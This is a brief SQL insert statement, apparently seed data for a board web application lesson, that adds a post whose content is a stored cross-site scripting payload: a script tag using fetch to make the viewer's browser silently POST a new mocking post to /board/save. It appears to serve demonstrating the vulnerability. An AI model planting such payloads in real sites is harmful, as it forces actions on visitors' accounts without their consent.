...
insert into board_tb(title, content, created_at, user_id)
values ('제목6 : ssar님 급해요!!',
        '<script>fetch(`/board/save`, {method: "POST",headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},body: "title=코스바보&content=진짜바보"});</script>',
        now(), 2);